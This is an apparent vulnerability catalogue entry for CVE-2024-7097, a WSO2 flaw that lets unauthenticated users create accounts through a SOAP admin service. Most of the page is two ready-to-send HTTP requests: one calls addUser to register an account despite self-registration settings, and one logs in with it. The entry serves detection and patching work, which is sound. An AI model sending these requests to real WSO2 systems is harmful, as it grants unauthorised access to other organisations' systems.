_cves/2024/cve-2024-7097.md

---
layout: "post"
cve_id: "CVE-2024-7097"
title: "WSO2 User Registration - Arbitrary Account Creation"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-7097.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-7097.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "medium"
impact: "Unauthenticated attackers can bypass self-registration restrictions to create arbitrary user accounts, potentially gaining unauthorized access to the WSO2 system and its resources.
"
remediation: "Apply security patches from WSO2 as outlined in security advisory WSO2-2024-3574 to address the arbitrary account creation vulnerability.
"
reference:
  - "https://sec.vnpt.vn/2025/01/canh-bao-lo-hong-nghiem-trong-tren-nen-tang-xac-thuc-tap-trung-wso2-anh-huong-den-nhieu-co-quan-to-chuc-bo-ban-nganh/"
  - "https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3574/"
classification: "{'epss-score': 0.13504, 'epss-percentile': 0.93987}"
metadata: "{'verified': True, 'max-request': 2, 'shodan-query': 'WSO2 Carbon Server'}"
tags:
  - "cve"
  - "cve2024"
  - "wso2"
  - "intrusive"
  - "auth-bypass"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## 🔍 Vulnerability Description
The SOAP admin service in WSO2 products has a security vulnerability that allows the creation of new user accounts regardless of the self-registration configuration settings.


## 🌐 HTTP Request
```nohighlight
POST /services/UserRegistrationAdminService.UserRegistrationAdminServiceHttpsSoap11Endpoint/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Connection: close
Content-Length: 361
Content-Type: text/xml
SOAPAction: "urn:addUser"
Accept-Encoding: gzip

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://org.apache.axis2/xsd">
   <soapenv:Header/>
   <soapenv:Body>
      <xsd:addUser>
<xsd:user>
         <xsd:userName>gOtmsr</xsd:userName>
         <xsd:password>oyVHIIkN</xsd:password>
</xsd:user>
      </xsd:addUser>
   </soapenv:Body>
</soapenv:Envelope>
```

```nohighlight
POST /services/AuthenticationAdmin HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Connection: close
Content-Length: 374
Content-Type: text/xml
SOAPAction: ""
Accept-Encoding: gzip

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:aut="http://authentication.services.core.carbon.wso2.org">
   <soapenv:Header/>
   <soapenv:Body>
      <aut:login>
         <aut:username>gOtmsr</aut:username>
         <aut:password>oyVHIIkN</aut:password>
      </aut:login>
   </soapenv:Body>
</soapenv:Envelope>
```

